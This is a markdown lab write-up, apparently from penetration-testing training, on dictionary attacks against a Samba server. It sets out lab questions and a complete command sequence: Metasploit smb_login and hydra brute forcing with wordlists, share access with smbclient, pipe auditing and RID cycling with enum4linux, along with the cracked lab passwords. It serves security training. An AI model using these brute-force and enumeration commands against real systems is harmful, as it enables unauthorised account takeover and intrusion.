# Samba Recon: Dictionary Attack

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 2927–2985. Examples are lab-specific and need verification.

SMB (Server Message Block) is a network file sharing protocol that allows applications and users to read and write to files and request services from server programs in a computer network. In this lab we will look at the dictionary attack on SMB server.

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.

**Objective:** Answer the following questions:

1. What is the password of user “jane” required to access share “jane”? Use smb_login metasploit module with password wordlist /usr/share/wordlists/metasploit/unix_passwords.txt
2. What is the password of user “admin” required to access share “admin”? Use hydra with password wordlist: /usr/share/wordlists/rockyou.txt
3. Which share is read only? Use smbmap with credentials obtained in question 2.
4. Is share “jane” browseable? Use credentials obtained from the 1st question.
5. Fetch the flag from share “admin”
6. List the named pipes available over SMB on the samba server? Use pipe_auditor metasploit module with credentials obtained from question 2.
7. List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling using enum4Linux with credentials obtained in question 2

**Tools: smbmap, msf, enum4linux, smbclient, hydra**

```bash
nmap -Pn -sV -O demo.ine.local
//version: **samba 139 &445 smb**
msfconsole -q
use auxiliary/scanner/smb/smb_login
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser jane
set RHOSTS demo.ine.local
exploit
//jane:abc123

gzip -d /usr/share/wordlists/rockyou.txt.gz
hydra -l admin -P /usr/share/wordlists/rockyou.txt demo.ine.local smb
or
hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb

smbmap -H demo.ine.local -u admin -p password1
smbclient -L demo.ine.local -U jane
smbclient //demo.ine.local/jane -U jane

smbclient //demo.ine.local/admin -U admin
ls
cd hidden
ls
get flag.tar.gz
exit
tar -xf flag.tar.gz
**cat flag**

msfconsole -q
use auxiliary/scanner/smb/pipe_auditor
set SMBUser admin
set SMBPass password1
set RHOSTS demo.ine.local
exploit

enum4linux -r -u "admin" -p "password1" demo.ine.local
```

In this lab, we learned about the dictionary attack on SMB server.
